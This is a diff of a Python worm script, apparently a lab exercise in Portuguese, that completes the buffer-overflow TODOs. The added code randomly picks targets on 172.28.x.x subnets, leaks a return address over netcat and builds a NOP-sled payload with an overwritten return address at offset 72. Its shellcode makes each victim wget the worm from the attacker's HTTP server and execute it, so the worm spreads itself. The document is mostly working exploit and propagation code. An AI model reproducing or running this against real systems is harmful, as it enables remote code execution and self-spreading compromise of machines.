@@ -50,11 +50,17 @@ def create_hex_command(command = b"echo 'true' > infectado.txt"):
     return shellcode_dinamico
 
 def getNextTarget():
-    """Gera uma lista com todos os possíveis IPs dentro das sub-redes (172.28.1.10 a 172.28.5.14)."""
-    # TODO: implementar a função que pega o próximo ip
-    return "172.28.1.10"
+    """Gera uma lista com todos os possíveis IPs dentro das sub-redes (172.28.1.10 a 172.28.5.14) e escolhe um aleatoriamente."""
+    
+    ips = []
 
-def getBadfile(n_line, malicious_code):
+    for subnet in range(1, 6):
+        for host in range(10, 15):
+            ips.append(f"172.28.{subnet}.{host}")
+    
+    return ips[randint(0, len(ips) - 1)]
+
+def getBadfile(ret_code, malicious_code):
     """
         Task 1: O Ataque de Buffer Overflow
         Construa a sua carga maliciosa (payload) aqui.
@@ -62,19 +68,13 @@ def getBadfile(n_line, malicious_code):
     # Preenche o buffer com instruções NOP (0x90) -> pula pra próxima operação
     content = bytearray(0x90 for i in range(500))
 
-    # shellcode = create_hex_command(command)
-    # ===================================================================
-    # TODO: Defina onde o shellcode vai ficar no payload
-    # start = ...
-    # content[start:] = shellcode
+    start = 500 - len(malicious_code)
+    content[start:] = malicious_code
 
-    # TODO: Calcule o Offset e o Endereço de Retorno correto da vítima
-    # ret    =   # Substitua pelo endereço de retorno real (aponta para o seu NOP sled/shellcode)
-    # offset =   # Substitua pelo deslocamento (offset) correto, que pode ser descoberto por GDB
-
-    # L = ...
-    # content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")
-    # ===================================================================
+    ret = ret_code + 0x100
+    offset = 72
+    L = 8
+    content[offset:offset + L] = (ret).to_bytes(L, byteorder="little")
 
     return content
 
@@ -96,14 +96,29 @@ def main():
     targetIP = getNextTarget()
     print(f"Alvo selecionado: {targetIP}")
 
-    # 1. Abre uma porta em background no NOSSO host para entregar o worm.py
-    # O comando 'nc -lnvp 8080 < worm.py' fica esperando a vítima conectar
-    # é necessário abrir um subprocesso com o comando
+    print(f"Capturando endereço de memória de {targetIP}...")
+    resultado_leak = subprocess.check_output(f"echo | nc {targetIP} 9090", shell=True).decode()
+    partes = resultado_leak.split("0x")
+    if len(partes) < 2:
+        print("Erro: Não foi possível capturar o endereço de memória.")
+        return
+    addr_str = partes[1].split()[0]
+    leak_ret = int(addr_str, 16)
 
-    # 2. Cria o comando que a VÍTIMA vai executar ao receber o Buffer Overflow
-    # Ela vai conectar no nosso IP, baixar o arquivo, dar permissão e rodar
+    meu_ip = socket.gethostbyname(socket.gethostname())
     
-    # 4. Fecha o servidor temporário após o envio
+    servidor = subprocess.Popen(["python3", "-m", "http.server", "8080"], 
+                                stdout=subprocess.DEVNULL, 
+                                stderr=subprocess.DEVNULL)
+    
+    comando = f"echo 'true' > infectado.txt && wget http://{meu_ip}:8080/worm.py && chmod +x worm.py && ./worm.py &"
+    
+    shellcode = create_hex_command(comando.encode())
+    badfile = getBadfile(leak_ret, shellcode) 
+
+    inject(badfile, targetIP)
+
+    servidor.terminate()
     
     print("Ataque concluído com sucesso! :D")
     exit()
